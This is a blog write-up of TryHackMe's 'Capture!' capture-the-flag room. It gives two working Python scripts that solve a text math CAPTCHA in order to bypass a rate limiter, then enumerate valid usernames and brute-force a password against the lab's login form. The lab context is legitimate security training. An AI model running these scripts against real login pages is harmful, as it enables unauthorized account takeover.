---
layout: post
title: Writeup for TryHackMe's "Capture!" Room
subtitle: By Anthony J. Saab
tags: ["https://tryhackme.com/room/capture"]
comments: false
---

# 0 - Introduction
This is a free room, created by toxicat0r and published on  May 5th, 2023.

Difficulty: Easy
# 1 - Context
## 1a - Given information

"SecureSolaCoders has once again developed a web application. They were tired of hackers enumerating and exploiting their previous login form. They thought a Web Application Firewall (WAF) was too overkill and unnecessary, so they developed their own rate limiter and modified the code slightly.
Before we start, download the required files by pressing the Download Task Files button."

The required file is a ZIP archive containing two files: usernames.txt & passwords.txt

## 1b - What we know so far
- No WAF
- Rate limiter exists
- Bruteforce is required (implied)

# 2 - Inspecting the website
## 2a - Screenshots
### Front Page before doing anything
![Target Website's Front Page](https://i.imgur.com/fSQMOpQ.png)

### Trying a random login attempt
![Trying a random login attempt](https://i.imgur.com/LvLWcdg.png)

### Spamming wrong credentials to trigger rate-limiter
![Spamming wrong credentials to trigger rate-limiter](https://i.imgur.com/3999W72.png)

## 2b - What we know so far
- Website's front page redirects to login page
- Login page will disclose whether a username exists in the database
- Rate-limiter trigger after around 10 wrong attempts
- Rate-limiter cannot be bypassed by clearing cookies, changing user-agent or using a different source IP
- The CAPTCHA is a math problem returned as text
- The CAPTCHA always has two operands and one of the following operators: +, - or *

# 3 - Enumerating correct usernames
## 3a - Python code used
```python
#!/usr/bin/python3

"""
Use this code shortly after having triggered the rate-limiter manually.
Replace the MACHINE_IP with the IP of your target machine's IP.
"""

import re
import requests
import sys

def main(MACHINE_IP):
    # Loads usernames from task files
    nhu = open("usernames.txt")
    users = nhu.read().split("\n")
    nhu.close()

    # Garbage request sent to collect the CAPTCHA challenge
    data = {
        'username': 'test',
        'password': 'test',
        'captcha': '123',
    }
    response = requests.post(f'http://{MACHINE_IP}/login', data=data)

    for u in users:
        captcha_data = re.search(r"(\d*) (\W) (\d*) = \?", str(response.content)).groups()
        if captcha_data[1] == "+":
            captcha_result = int(captcha_data[0]) + int(captcha_data[2])
        elif captcha_data[1] == "-":
            captcha_result = int(captcha_data[0]) - int(captcha_data[2])
        elif captcha_data[1] == "*":
            captcha_result = int(captcha_data[0]) * int(captcha_data[2])
        data = {
            'username': str(u),
            'password': 'test',
            'captcha': str(captcha_result),
        }
        response = requests.post(f'http://{MACHINE_IP}/login', data=data)
        valid = not re.search(r'The user (.*?) does not exist', str(response.content))
        if valid:
            print(u)


if __name__ == "__main__":
    MACHINE_IP = sys.argv[1]
    main(MACHINE_IP)

```

## 3b - Output
![User enum Output](https://i.imgur.com/XBIxk1S.png)

# 4 - Finding correct password
## 4a - Error message for wrong password
![Error message for wrong password](https://i.imgur.com/wcklhMy.png)
## 4b - Python Code
```python
#!/usr/bin/python3

"""
Use this code shortly after having triggered the rate-limiter manually.
Example usage in terminal: ./password_bruteforce.py 10.10.229.208 john
This code and the passwords.txt should be located in the same directory
"""

import re
import requests
import sys

def main(MACHINE_IP, CORRECT_USERNAME):
    # Loads passwords from task files
    nhp = open("passwords.txt")
    passwords = nhp.read().split("\n")
    nhp.close()

    # Garbage request sent to collect the CAPTCHA challenge
    data = {
        'username': 'test',
        'password': 'test',
        'captcha': '123',
    }
    response = requests.post(f'http://{MACHINE_IP}/login', data=data)

    for p in passwords:
        captcha_data = re.search(r"(\d*) (\W) (\d*) = \?", str(response.content)).groups()
        if captcha_data[1] == "+":
            captcha_result = int(captcha_data[0]) + int(captcha_data[2])
        if captcha_data[1] == "-":
            captcha_result = int(captcha_data[0]) - int(captcha_data[2])
        if captcha_data[1] == "*":
            captcha_result = int(captcha_data[0]) * int(captcha_data[2])
        data = {
            'username': str(CORRECT_USERNAME),
            'password': str(p),
            'captcha': str(captcha_result),
        }
        response = requests.post(f'http://{MACHINE_IP}/login', data=data)
        valid = not re.search(r'Invalid password for user', str(response.content))
        if valid:
            print(p)
            exit(0)

if __name__ == "__main__":
    MACHINE_IP = sys.argv[1]
    CORRECT_USERNAME = sys.argv[2]
    main(MACHINE_IP, CORRECT_USERNAME)
```
## 4c - Output
![Password found!](https://i.imgur.com/wh56Tr1.png)

# 5 - The Flag!
![Flag](https://i.imgur.com/ZtkTmLT.png)
